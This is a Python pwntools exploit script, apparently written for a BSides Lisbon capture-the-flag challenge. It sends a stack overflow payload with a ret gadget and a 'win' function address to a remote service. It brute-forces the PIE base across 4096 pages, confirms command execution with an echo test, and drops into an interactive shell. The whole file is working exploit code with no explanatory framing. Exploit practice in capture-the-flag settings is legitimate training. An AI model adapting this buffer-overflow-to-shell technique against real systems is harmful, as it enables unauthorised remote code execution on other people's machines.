#!/usr/bin/env python3

from pwn import *
import sys

# Set up pwntools
context.update(arch='amd64', os='linux', log_level='warn')

HOST = "7b44d3bf-0008-4576-b715-b08d8cb090b7-lmao.challs.bsideslisbon.org"
PORT = 20298

def try_base(base):
    """Try exploit with a specific base address"""
    try:
        r = remote(HOST, PORT, level='error')
        r.recvuntil(b"You say: ", timeout=2)
        
        # Build payload with stack alignment
        payload = b"LMAO"
        payload += b"A" * 28
        payload += b"B" * 8
        payload += p64(base + 0x1016)  # ret gadget
        payload += p64(base + 0x11a9)  # win function
        
        r.sendline(payload)
        r.recvuntil(b"RhsUP2ykTGc\n", timeout=1)
        
        # Try to run a command
        r.sendline(b"echo PWNED123")
        response = r.recv(timeout=0.5)
        
        if b"PWNED123" in response:
            return r
        
        r.close()
        return None
    except Exception as e:
        return None

def main():
    log.info(f"Attacking {HOST}:{PORT}")
    log.info("Brute forcing PIE base address...")
    
    # Try common base addresses
    # PIE typically loads at 0x555555554000 + random_offset
    # The offset is usually page-aligned (0x1000 increments)
    
    for i in range(4096):  # Try 4096 pages = 16MB range
        base = 0x555555554000 + (i * 0x1000)
        
        if i % 100 == 0:
            log.info(f"Progress: {i}/4096 - trying base {hex(base)}")
        
        r = try_base(base)
        if r:
            log.success(f"Found working base: {hex(base)}")
            log.success("Getting shell...")
            r.interactive()
            return 0
    
    log.error("Failed to find working base address")
    return 1

if __name__ == "__main__":
    sys.exit(main())
